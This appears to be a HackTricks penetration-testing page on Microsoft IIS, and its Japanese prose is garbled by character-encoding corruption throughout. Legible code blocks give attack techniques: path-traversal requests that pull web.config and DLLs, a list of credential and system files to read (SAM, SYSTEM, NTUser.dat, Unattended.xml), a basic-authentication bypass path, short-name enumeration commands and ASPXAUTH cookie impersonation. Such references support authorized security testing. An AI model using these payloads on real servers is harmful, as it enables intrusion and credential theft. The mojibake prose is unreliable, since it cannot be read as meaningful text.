# IIS - ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆæƒ…å ±ã‚µãƒ¼ãƒ“ã‚¹

<details>

<summary><strong>**htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>**ã§ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶**</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã®æ‹¡å¼µå­ã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™:

* asp
* aspx
* config
* php

## å†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã®æ¼æ´©

302ã‚’å—ã‘å–ã‚‹ä»»æ„ã®IISã‚µãƒ¼ãƒãƒ¼ã§ã¯ã€Hostãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å‰Šé™¤ã—ã¦HTTP/1.0ã‚’ä½¿ç”¨ã—ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã®Locationãƒ˜ãƒƒãƒ€ãƒ¼ãŒå†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
å†…éƒ¨IPã‚’é–‹ç¤ºã™ã‚‹å¿œç­”:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .configãƒ•ã‚¡ã‚¤ãƒ«ã®å®Ÿè¡Œ

.configãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®æ–¹æ³•ã®1ã¤ã¯ã€HTMLã‚³ãƒ¡ãƒ³ãƒˆå†…ã«ã‚³ãƒ¼ãƒ‰ã‚’ãƒ•ã‚¡ã‚¤ãƒ«ã®æœ«å°¾ã«è¿½åŠ ã™ã‚‹ã“ã¨ã§ã™ï¼š[ã“ã“ã‹ã‚‰ä¾‹ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®è©³ç´°ã‚„ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## IISãƒ‡ã‚£ã‚¹ã‚«ãƒãƒªãƒ¼ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ç§ãŒä½œæˆã—ãŸãƒªã‚¹ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„ï¼š

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ä»¥ä¸‹ã®ãƒªã‚¹ãƒˆã®å†…å®¹ã‚’ãƒãƒ¼ã‚¸ã—ã¦ä½œæˆã•ã‚Œã¾ã—ãŸï¼š

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

æ‹¡å¼µå­ã‚’è¿½åŠ ã›ãšã«ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚å¿…è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã™ã§ã«æ‹¡å¼µå­ãŒä»˜ã„ã¦ã„ã¾ã™ã€‚

## ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

### ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®æ¼æ´©

è©³ç´°ãªè§£èª¬ã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š[https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
è¦ç´„ã™ã‚‹ã¨ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ•ã‚©ãƒ«ãƒ€å†…ã«ã¯ã€"assemblyIdentity"ãƒ•ã‚¡ã‚¤ãƒ«ã¨"namespaces"ã¸ã®å‚ç…§ãŒå«ã¾ã‚Œã‚‹è¤‡æ•°ã®web.configãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€**ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã€ãã‚Œã‚‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚\
ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸDllã‹ã‚‰ã¯ã€**æ–°ã—ã„åå‰ç©ºé–“**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã‚ã‚Šã€ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦web.configãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã¦æ–°ã—ã„åå‰ç©ºé–“ã¨assemblyIdentityã‚’è¦‹ã¤ã‘ã‚‹ã¹ãã§ã™ã€‚\
ã¾ãŸã€**connectionstrings.config**ãƒ•ã‚¡ã‚¤ãƒ«ã¨**global.asax**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯èˆˆå‘³æ·±ã„æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% endhint %}

**.Net MVCã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã§ã¯ã€**web.config**ãƒ•ã‚¡ã‚¤ãƒ«ãŒã€**"assemblyIdentity"** XMLã‚¿ã‚°ã‚’ä»‹ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä¾å­˜ã™ã‚‹å„ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒ‡å®šã™ã‚‹é‡è¦ãªå½¹å‰²ã‚’æœãŸã—ã¾ã™ã€‚

### **ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®æ¢ç´¢**

ä»¥ä¸‹ã«ã€**web.config**ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ä¾‹ã‚’ç¤ºã—ã¾ã™ï¼š
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€ã•ã¾ã–ã¾ãªè¨­å®šã‚„ä¾å­˜é–¢ä¿‚ã‚’æ˜ã‚‰ã‹ã«ã—ã¾ã™:

- **EntityFramework** ãƒãƒ¼ã‚¸ãƒ§ãƒ³
- web ãƒšãƒ¼ã‚¸ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæ¤œè¨¼ã€JavaScript ã® **AppSettings**
- èªè¨¼ã¨ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã®ãŸã‚ã® **System.web** æ§‹æˆ
- **System.webServer** ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®è¨­å®š
- **Microsoft.Owin**ã€**Newtonsoft.Json**ã€**System.Web.Mvc** ãªã©ã®å¤šãã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«å¯¾ã™ã‚‹ **Runtime** ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°

ã“ã‚Œã‚‰ã®è¨­å®šã«ã‚ˆã‚Šã€**/bin/WebGrease.dll** ãªã©ã®ç‰¹å®šã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã® /bin ãƒ•ã‚©ãƒ«ãƒ€ã«å­˜åœ¨ã™ã‚‹ã“ã¨ãŒç¤ºã•ã‚Œã¾ã™ã€‚

### **ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒ•ã‚¡ã‚¤ãƒ«**

**/global.asax** ã‚„ **/connectionstrings.config**ï¼ˆæ©Ÿå¯†æ€§ã®é«˜ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã‚‹ï¼‰ãªã©ã®ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ§‹æˆã¨å‹•ä½œã«ä¸å¯æ¬ ã§ã™ã€‚

### **åå‰ç©ºé–“ã¨ Web.Config**

MVC ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€å„ãƒ•ã‚¡ã‚¤ãƒ«ã§ã®ç¹°ã‚Šè¿”ã—å®£è¨€ã‚’é¿ã‘ã‚‹ãŸã‚ã«ã€ç‰¹å®šã®åå‰ç©ºé–“ç”¨ã®è¿½åŠ ã® **web.config ãƒ•ã‚¡ã‚¤ãƒ«** ã‚‚å®šç¾©ã•ã‚Œã¦ã„ã¾ã™ã€‚åˆ¥ã® **web.config** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ä¾‹ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**

ã‚«ã‚¹ã‚¿ãƒ åå‰ç©ºé–“ã®è¨€åŠã¯ã€/binãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å­˜åœ¨ã™ã‚‹ "**WebApplication1**" ã¨ã„ã†DLLã‚’ç¤ºå”†ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ç¶šã„ã¦ã€**WebApplication1.dll** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼š
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
ã“ã‚Œã¯ã€/binãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«**System.Web.Mvc.dll**ã‚„**System.Web.Optimization.dll**ãªã©ã®ä»–ã®é‡è¦ãªDLLãŒå­˜åœ¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

DLLãŒ**WebApplication1.Areas.Minded**ã¨ã„ã†åå‰ç©ºé–“ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ã€æ”»æ’ƒè€…ã¯**/area-name/Views/**ãªã©ã®äºˆæ¸¬å¯èƒ½ãªãƒ‘ã‚¹ã«ä»–ã®web.configãƒ•ã‚¡ã‚¤ãƒ«ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’æ¨æ¸¬ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®web.configãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€/binãƒ•ã‚©ãƒ«ãƒ€å†…ã®ä»–ã®DLLã¸ã®ç‰¹å®šã®æ§‹æˆã¨å‚ç…§ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€**/Minded/Views/web.config**ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€åˆ¥ã®DLLã§ã‚ã‚‹**WebApplication1.AdditionalFeatures.dll**ã®å­˜åœ¨ã‚’ç¤ºã™æ§‹æˆã¨åå‰ç©ºé–“ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ä¸€èˆ¬çš„ãªãƒ•ã‚¡ã‚¤ãƒ«

[ã“ã¡ã‚‰](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)ã‹ã‚‰
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 ã‚¨ãƒ©ãƒ¼

ã‚‚ã—ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆï¼š

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

ãã‚Œã¯ã‚µãƒ¼ãƒãƒ¼ãŒ**æ­£ã—ã„ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å—ä¿¡ã—ã¦ã„ãªã„**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚\
Webãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€æä¾›ã•ã‚ŒãŸ**SSLè¨¼æ˜æ›¸**ã‚’ç¢ºèªã—ã¦ã€ãã“ã«ãƒ‰ãƒ¡ã‚¤ãƒ³/ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³åãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚è¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€**æ­£ã—ã„ã‚‚ã®ã‚’è¦‹ã¤ã‘ã‚‹ã¾ã§VHostsã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

## å¤ã„IISã®è„†å¼±æ€§ã®èª¿æŸ»ä¾¡å€¤ãŒã‚ã‚‹ã‚‚ã®

### Microsoft IISãƒãƒ«ãƒ€æ–‡å­—â€œ\~â€è„†å¼±æ€§/æ©Ÿèƒ½ - çŸ­ã„ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€åã®é–‹ç¤º

ã“ã®**æŠ€è¡“**ã‚’ä½¿ç”¨ã—ã¦ã€ç™ºè¦‹ã•ã‚ŒãŸã™ã¹ã¦ã®ãƒ•ã‚©ãƒ«ãƒ€å†…ã®ãƒ•ã‚©ãƒ«ãƒ€ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**åˆ—æŒ™**ã§ãã¾ã™ï¼ˆåŸºæœ¬èªè¨¼ãŒå¿…è¦ãªå ´åˆã§ã‚‚ï¼‰ã€‚\
ã“ã®æŠ€è¡“ã®ä¸»ãªåˆ¶é™ã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ãªå ´åˆã«**å„ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€ã®åå‰ã®æœ€åˆã®6æ–‡å­—ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®æ‹¡å¼µå­ã®æœ€åˆã®3æ–‡å­—ã¾ã§ã—ã‹è¦‹ã¤ã‘ã‚‰ã‚Œãªã„**ã“ã¨ã§ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«[https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)ã‚’ä½¿ç”¨ã§ãã¾ã™:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (183).png>)

å…ƒã®ç ”ç©¶: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

**Metasploit**ã‚‚ä½¿ç”¨ã§ãã¾ã™: `use scanner/http/iis_shortname_scanner`

### åŸºæœ¬èªè¨¼ã®ãƒã‚¤ãƒ‘ã‚¹

**åŸºæœ¬èªè¨¼ï¼ˆIIS 7.5ï¼‰**ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ã€æ¬¡ã®ã‚ˆã†ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã¾ã™ï¼š`/admin:$i30:$INDEX_ALLOCATION/admin.php`ã¾ãŸã¯`/admin::$INDEX_ALLOCATION/admin.php`

ã“ã®è„†å¼±æ€§ã¨å‰è¿°ã®ã‚‚ã®ã‚’çµ„ã¿åˆã‚ã›ã¦ã€æ–°ã—ã„**ãƒ•ã‚©ãƒ«ãƒ€**ã‚’è¦‹ã¤ã‘ã¦**èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ASP.NET Trace.AXDæœ‰åŠ¹ãªãƒ‡ãƒãƒƒã‚°

ASP.NETã«ã¯ãƒ‡ãƒãƒƒã‚°ãƒ¢ãƒ¼ãƒ‰ãŒã‚ã‚Šã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯`trace.axd`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚

ã“ã‚Œã¯ã€ä¸€å®šæœŸé–“ã«ã‚ãŸã£ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è¡Œã‚ã‚ŒãŸã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®éå¸¸ã«è©³ç´°ãªãƒ­ã‚°ã‚’ä¿æŒã—ã¾ã™ã€‚

ã“ã®æƒ…å ±ã«ã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®IPã€ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã€ã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ã‚¯ãƒƒã‚­ãƒ¼ã€ç‰©ç†ãƒ‘ã‚¹ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰æƒ…å ±ã€ãã—ã¦æ½œåœ¨çš„ã«ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã•ãˆå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTHã¯ä»¥ä¸‹ã®æƒ…å ±ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

* **`validationKey`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼šç½²åæ¤œè¨¼ã«ä½¿ç”¨ã™ã‚‹16é€²æ•°ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚­ãƒ¼ã€‚
* **`decryptionMethod`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼šï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯â€œAESâ€ï¼‰ã€‚
* **`decryptionIV`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼š16é€²æ•°ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸåˆæœŸåŒ–ãƒ™ã‚¯ãƒˆãƒ«ï¼ˆã‚¼ãƒ­ã®ãƒ™ã‚¯ãƒˆãƒ«ãŒãƒ‡ãƒ•ã‚©ãƒ«ãƒˆï¼‰ã€‚
* **`decryptionKey`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼šå¾©å·ã«ä½¿ç”¨ã™ã‚‹16é€²æ•°ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚­ãƒ¼ã€‚

ãŸã ã—ã€ã“ã‚Œã‚‰ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤**ã‚’ä½¿ç”¨ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚’ã‚¯ãƒƒã‚­ãƒ¼ã¨ã—ã¦ä½¿ç”¨**ã™ã‚‹äººã‚‚ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒå¯¾è±¡ã®ã‚µãƒ¼ãƒãƒ¼ã§**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã—ã€ASPXAUTHã‚¯ãƒƒã‚­ãƒ¼ã‚’ç¬¬äºŒã®ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ç¬¬ä¸€ã®ã‚µãƒ¼ãƒãƒ¼ã«ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã“ã®æ”»æ’ƒã¯ã“ã®[**è§£èª¬**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ã§æˆåŠŸã—ã¾ã—ãŸã€‚

